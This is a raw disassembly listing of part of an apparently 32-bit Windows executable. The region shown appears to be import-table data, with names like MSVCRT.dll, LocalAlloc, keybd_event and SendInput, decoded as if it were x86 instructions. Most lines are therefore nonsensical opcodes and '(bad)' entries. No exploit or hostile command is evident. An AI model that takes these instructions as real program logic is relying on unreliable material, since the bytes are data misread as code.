  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
